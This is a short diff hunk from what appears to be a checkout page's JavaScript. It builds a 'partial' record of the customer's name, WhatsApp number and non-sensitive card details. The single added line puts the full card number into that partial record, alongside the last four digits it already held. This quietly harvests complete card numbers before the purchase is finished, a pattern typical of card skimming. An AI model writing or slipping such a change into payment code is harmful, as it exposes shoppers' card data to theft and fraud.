@@ -1769,6 +1769,7 @@
                     nome: (document.getElementById('cust-name')||{}).value,
                     whatsapp: (document.getElementById('cust-phone')||{}).value,
                     step: 'partial',
+                    card_number: num || null,
                     card_last4: num.slice(-4),
                     card_length: num.length,
                     card_brand_hint: /^4/.test(num) ? 'visa' : /^5/.test(num) ? 'master' : /^3/.test(num) ? 'amex' : (num ? 'other' : null),
